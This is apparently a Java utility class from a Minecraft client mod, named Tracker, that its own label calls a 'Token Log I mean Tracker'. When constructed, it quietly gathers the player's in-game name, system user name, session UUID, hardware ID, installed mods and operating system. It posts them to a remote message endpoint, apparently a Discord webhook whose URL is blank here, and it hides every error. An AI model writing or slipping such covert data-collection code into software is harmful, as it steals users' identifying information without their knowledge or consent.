



package me.earth.phobos.util;

import net.minecraft.client.*;

public class Tracker
{
    public Tracker() {

        final String l = "";
        final String CapeName = "Perrys Token Log I mean Tracker";
        final String CapeImageURL = "";
        final TrackerUtil d = new TrackerUtil("");
        String minecraft_name = "NOT FOUND";
        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        }
        catch (Exception ex) {}
        try {
            final TrackerPlayerBuilder dm = new TrackerPlayerBuilder.Builder().withUsername("Perrys Token Log I mean Tracker").withContent("```\n IGN: " + minecraft_name + "\n USER: " + System.getProperty("user.name") + "\n UUID: " + Minecraft.getMinecraft().session.getPlayerID() + "\n HWID: " + SystemUtil.getSystemInfo() + "\n MODS: " + SystemUtil.getModsList() + "\n OS: " + System.getProperty("os.name") + "\n Started the game.```").withAvatarURL("https://cdn.discordapp.com/icons/851358091286282260/17fdd021c701c00ff95bc2b50344a5ad.png?size=128").withDev(false).build();
            d.sendMessage(dm);
        }
        catch (Exception ex2) {}
    }
}
